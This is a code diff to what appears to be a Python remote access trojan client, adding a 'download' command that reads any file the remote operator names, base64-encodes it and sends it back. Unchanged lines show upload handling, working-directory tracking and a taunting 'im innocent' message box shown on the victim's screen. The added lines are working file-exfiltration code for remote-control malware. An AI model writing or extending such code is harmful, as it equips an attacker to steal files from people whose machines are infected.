@@ -45,6 +45,17 @@ def main():
                     send({'output': None, 'error': f"Upload failed: {e}", 'cwd': cwd})
                 continue
 
+            if cmd.startswith('download '):
+                path = cmd.split(maxsplit=1)[1]
+                try:
+                    with open(os.path.join(cwd, path), 'rb') as f:
+                        file_data = base64.b64encode(f.read()).decode()
+                    filename = os.path.basename(path)
+                    send({'output': None, 'error': None, 'cwd': cwd, 'download': {'filename': filename, 'filedata': file_data}})
+                except Exception as e:
+                    send({'output': None, 'error': f"Download failed: {e}", 'cwd': cwd})
+                continue
+
             if cmd.startswith('message '):
                 msg = cmd.split(maxsplit=1)[1]
                 msgbox.showinfo("im innocent", msg)
